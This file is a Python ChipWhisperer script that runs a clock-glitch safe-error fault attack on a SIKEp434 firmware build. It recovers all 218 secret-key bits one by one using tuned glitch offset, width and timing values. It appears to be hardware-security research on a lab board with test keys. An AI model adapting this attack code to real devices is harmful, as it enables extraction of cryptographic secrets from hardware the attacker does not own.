import os
from datetime import datetime
import time
import chipwhisperer.common.results.glitch as glitch
from importlib import reload
import chipwhisperer.common.results.glitch as glitch
from tqdm.notebook import tqdm
import re
import struct
import random
import chipwhisperer as cw
import sys
import numpy as np

SCOPETYPE = 'OPENADC'
PLATFORM = 'CWLITEARM'
NTRIAL = 1
BIT = 0
OUTPUT_FILE = ''

SK = [0] * 218

def main(argv):
    if(len(argv) != 3):
        print(
            "\nplease specify the path and numer of trials\npython SIKE_C_safe_error.py [path] [key: 0 / 1 / 2] [ntrials] \ne.g. python SIKE_C_safe_error.py /home/me/chipwhisperer/hardware/victims/firmware/SIKE/ 0 10\n")
        sys.exit()
    else:
        PATH = argv[0]
        KEY = int(argv[1])
        NTRIAL = int(argv[2])

        if(KEY == 0):
            SK = [0] * 218
        elif(KEY == 1):
            SK = [1] * 218
        elif(KEY == 2):
            SK = [1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 1]

        os.chdir(PATH)
        dateTime = datetime.now()
        OUTPUT_FILE = "SIKE_C_full_key_recovery_" + dateTime.strftime("%m_%d_%Y") + ".txt"

        bad_guys = [31, 64, 95, 128, 159, 192]
        not_so_bad_guys = [0, 32, 63, 96, 127, 160, 191]

        for bit in range(0, 218):
            prob = 0
            make = "make PLATFORM=CWLITEARM CRYPTO_TARGET=NONE FUNC_SEL=ATTACK_BIT_" + str(bit) + " KEY=KEY_" + str(KEY)

            os.system(make)

            ###############################  %run "../../Setup_Scripts/Setup_Generic.ipynb"

            try:
                if not scope.connectStatus:
                    scope.con()
            except NameError:
                scope = cw.scope()
            
            try:
                target = cw.target(scope)
            except IOError:
                print("INFO: Caught exception on reconnecting to target - attempting to reconnect to scope first.")
                print("INFO: This is a work-around when USB has died without Python knowing. Ignore errors above this line.")
                scope = cw.scope()
                target = cw.target(scope)

            print("INFO: Found ChipWhisperer😍")

            if "STM" in PLATFORM or PLATFORM == "CWLITEARM" or PLATFORM == "CWNANO":
                prog = cw.programmers.STM32FProgrammer
            elif PLATFORM == "CW303" or PLATFORM == "CWLITEXMEGA":
                prog = cw.programmers.XMEGAProgrammer
            else:
                prog = None


            time.sleep(0.05)
            scope.default_setup()
            def reset_target(scope):
                if PLATFORM == "CW303" or PLATFORM == "CWLITEXMEGA":
                    scope.io.pdic = 'low'
                    time.sleep(0.1)
                    scope.io.pdic = 'high_z' #XMEGA doesn't like pdic driven high
                    time.sleep(0.1) #xmega needs more startup time
                else:  
                    scope.io.nrst = 'low'
                    time.sleep(0.05)
                    scope.io.nrst = 'high_z'
                    time.sleep(0.05)

            #####################################################################        

            fw_path = PATH + "sikep434-{}.hex".format(PLATFORM)
            cw.program_target(scope, prog, fw_path)


            if PLATFORM == "CWLITEXMEGA":
                def reboot_flush():
                    scope.io.pdic = False
                    time.sleep(0.1)
                    scope.io.pdic = "high_z"
                    time.sleep(0.1)
                    #Flush garbage too
                    target.flush()
            else:
                def reboot_flush():
                    scope.io.nrst = False
                    time.sleep(0.05)
                    scope.io.nrst = "high_z"
                    time.sleep(0.05)
                    #Flush garbage too
                    target.flush()

            reboot_flush()

            target.write("g\n")
            time.sleep(12)

            val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10)
            valid = val['valid']
            if valid:
                response = val['payload']
                raw_serial = val['full_response']
                error_code = val['rv']
                if val['rv'] == 1:
                    print("All checks passed.😍\nStarting to attack bit {} : {} times ...".format(bit, NTRIAL))
                else:
                    print("Communication and/or key check error!\n")
                    sys.exit()                
            scope.glitch.clk_src = 'clkgen'
            scope.glitch.trigger_src = 'ext_single'
            scope.glitch.repeat = 1
            scope.glitch.output = "clock_xor"
            scope.io.hs2 = "glitch"

            gc = glitch.GlitchController(groups=["success", "reset", "normal"], parameters=["width", "offset", "ext_offset"])

            gc.set_range("width", 2, 36)
            gc.set_range("offset", -41, 14)
            gc.set_range("ext_offset", 0, 10)
            step = 1
            gc.set_global_step(step)
            scope.glitch.repeat = 1
            reboot_flush()
            cnt = 0 
            total_successes = 0
            scope.adc.timeout = 30
            S = ""
            sys.stdout.flush()
            scope.glitch.offset = 1.171875
            scope.glitch.width = 12.890625
            scope.glitch.ext_offset  = 37
            if(bit in bad_guys):
                scope.glitch.ext_offset  = 5
            if(bit in not_so_bad_guys):
                scope.glitch.ext_offset  = 2
            scope.glitch.repeat = 4
            successes = 0
            resets = 0
            for i in range(NTRIAL):
                cnt += 1
                if scope.adc.state:
                    resets += 1
                    reboot_flush()
                scope.arm()
                reboot_flush()
                target.write("g\n")
                time.sleep(12)

                ret = scope.capture()
                val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10)#For loop check

                if ret:
                    reboot_flush()
                    resets += 1
                else:
                    if val['valid'] is False:
                        #print("invalid")
                        resets += 1
                    else:
                        if val['rv'] == 0: #for loop check
                            successes += 1                    
            print("\nsuccesses = {}, resets = {}, offset = {}, width = {}, ext_offset = {}\n".format(successes, resets, scope.glitch.offset, scope.glitch.width, scope.glitch.ext_offset))
            total_successes += successes
            if(SK[bit]==0):
                S = S + "bit " + str(bit) + " : expected " + str(SK[bit]) + ", total successes = {}, trials = {}, ratio = {}\n".format(total_successes, cnt, (cnt-total_successes)/cnt)
            else:
                S = S + "bit " + str(bit) + " : expected " + str(SK[bit]) + ", total successes = {}, trials = {}, ratio = {}\n".format(total_successes, cnt, total_successes/cnt)

            print(S)
            file = open(OUTPUT_FILE,"a")
            file.write(S)
            file.close() 
            S = ""
            scope.dis()
            target.dis()
        
        file = open(OUTPUT_FILE,"a")
        dateTime = datetime.now()
        file.write(dateTime.strftime("%m/%d/%Y, %H:%M:%S"))
        file.close() 

if __name__ == "__main__":
    main(sys.argv[1:])